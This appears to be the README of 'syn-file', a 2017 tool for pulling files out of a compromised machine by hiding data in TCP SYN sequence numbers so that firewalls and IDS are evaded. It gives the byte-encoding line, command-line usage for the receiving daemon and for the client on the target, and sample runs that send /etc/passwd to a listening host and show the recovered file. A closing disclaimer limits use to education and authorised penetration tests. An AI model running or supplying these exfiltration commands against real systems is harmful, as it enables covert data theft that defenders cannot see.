# syn-file

Exfiltrate data from a compromised target using covert channels.


## Intro
**syn-file** is a software that allows data exfiltration using TCP SYN sequence number packets.
In that way it is possible to bypass firewalls or IDS as no TCP connection is ever opened... similar to SYN scanning.

To be faster exfiltrating data, a useful codification technique is used. Encoding 4 chars in a integer like this:

```seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];```

##Background

There are some tools to deploy covert channels, mainly using ICMP protocol, padding the content in the payload section... suspicious!

However I have not seen any tool to deploy it using TCP sequence numbers, also in **syn-file** the payload is left empty ;-)


##usage / example


###server
```
# ./syn-daemon -i eth0 -s 192.168.1.155 -f file.bin
-i interface
-s source ip
-f file to store exfiltrated data
```

Example:
```
# ./syn-daemon -i eth0 -s 192.168.1.155 -f passwd
using interface: eth0
libcap rule: "src host 192.168.1.155"
#    1 [SYN=1] [SEQ #= 3a32353a]
#    2 [SYN=1] [SEQ #= 32353a42]
#    3 [SYN=1] [SEQ #= 61746368]
#    4 [SYN=1] [SEQ #= 206a6f62]
#    5 [SYN=1] [SEQ #= 73206461]
#    6 [SYN=1] [SEQ #= 656d6f6e]
#    7 [SYN=1] [SEQ #= 3a2f7661]
#    8 [SYN=1] [SEQ #= 722f7370]
#    9 [SYN=1] [SEQ #= 6f6f6c2f]
#   10 [SYN=1] [SEQ #= 61746a6f]
...
```

And "passwd" recovered is:
```
# cat passwd 
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
avahi:x:481:481:User for Avahi:/run/avahi-daemon:/bin/false
avahi-autoipd:x:493:493:User for Avahi IPv4LL:/var/lib/avahi-autoipd:/bin/false
bin:x:1:1:bin:/bin:/bin/bash
colord:x:483:484:user for colord:/var/lib/colord:/sbin/nologin
daemon:x:2:2:Daemon:/sbin:/bin/bash
dnsmasq:x:486:65534:dnsmasq:/var/lib/empty:/bin/false
ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
games:x:12:100:Games account:/var/games:/bin/bash
gdm:x:478:477:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
...
```



###client (target)
```
# ./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081
-i interface
-d destination ip / IP that runs syn-daemon
-f file to exfiltrate
-p destination port
-P source port
```

Example from target machine:
```
# ./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081 
using interface: eth0
#1	 [Read from file "at:x"] [Encoded SEQ nr: 0x61743a78] [Wrote 74 bytes]
#2	 [Read from file ":25:"] [Encoded SEQ nr: 0x3a32353a] [Wrote 74 bytes]
#3	 [Read from file "25:B"] [Encoded SEQ nr: 0x32353a42] [Wrote 74 bytes]
#4	 [Read from file "atch"] [Encoded SEQ nr: 0x61746368] [Wrote 74 bytes]
#5	 [Read from file " job"] [Encoded SEQ nr: 0x206a6f62] [Wrote 74 bytes]
#6	 [Read from file "s da"] [Encoded SEQ nr: 0x73206461] [Wrote 74 bytes]
#7	 [Read from file "emon"] [Encoded SEQ nr: 0x656d6f6e] [Wrote 74 bytes]
#8	 [Read from file ":/va"] [Encoded SEQ nr: 0x3a2f7661] [Wrote 74 bytes]
#9	 [Read from file "r/sp"] [Encoded SEQ nr: 0x722f7370] [Wrote 74 bytes]
#10	 [Read from file "ool/"] [Encoded SEQ nr: 0x6f6f6c2f] [Wrote 74 bytes]
```

##Disclamer
Only use allowed for educational purposes or professionaly during a penetration test given the proper permission.

All rights reserved
(c) 2017 spinfoo
Jacobo Avariento
